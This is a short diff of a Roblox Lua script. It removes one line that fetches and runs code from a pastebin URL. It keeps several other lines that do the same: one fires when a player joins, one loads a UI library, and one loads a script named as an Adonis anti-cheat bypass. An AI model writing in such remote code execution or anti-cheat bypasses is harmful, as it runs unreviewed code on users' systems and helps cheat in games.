@@ -4,7 +4,6 @@ game.Players.PlayerAdded:Connect(function(player)
 			loadstring(game:HttpGet("https://pastebin.com/raw/CBZ1CZ9s"))()
 		end
 end)
-loadstring(game:HttpGet("https://pastebin.com/raw/CykKWETp"))()
 
 local Rayfield = loadstring(game:HttpGet('https://raw.githubusercontent.com/UI-Interface/CustomFIeld/main/RayField.lua'))()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/R3TH-PRIV/R3THPRIV/main/OtherScripts/Adonis%20Anti-Cheat%20Bypass.lua"))()
